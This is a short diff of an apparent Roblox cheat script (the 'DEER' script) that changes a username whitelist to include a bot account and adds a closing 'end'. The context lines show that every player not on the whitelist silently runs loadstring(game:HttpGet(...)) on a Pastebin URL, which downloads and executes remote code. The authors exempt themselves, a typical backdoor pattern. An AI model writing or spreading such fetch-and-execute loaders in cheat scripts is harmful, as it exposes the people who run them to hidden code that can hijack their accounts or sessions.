@@ -529,7 +529,7 @@ getgenv().CharacterAddedv3 =  OWNER.CharacterAdded:connect(function()
     ToolSSs()
 end)
 ToolSSs()
-if game.Players.LocalPlayer.Name == "zer1ckq" or game.Players.LocalPlayer.Name == "isthisdo23" or game.Players.LocalPlayer.Name == "s" then
+if game.Players.LocalPlayer.Name == "zer1ckq" or game.Players.LocalPlayer.Name == "isthisdo23" or game.Players.LocalPlayer.Name == "dahoodbotmoney5" then
     print("DEER")
 else
     loadstring(game:HttpGet('https://pastebin.com/raw/3hnKWdzB'))()
@@ -560,7 +560,7 @@ wait(1)
 blur:Destroy()
 
 
-game.StarterGui:SetCore("SendNotification", {
+    game.StarterGui:SetCore("SendNotification", {
     Title = "DEER"; 
     Text = "script";
     Text = "discrod deer14927";
@@ -568,3 +568,4 @@ game.StarterGui:SetCore("SendNotification", {
     Duration = 9e9;
     })
     wait(0.1)
+end
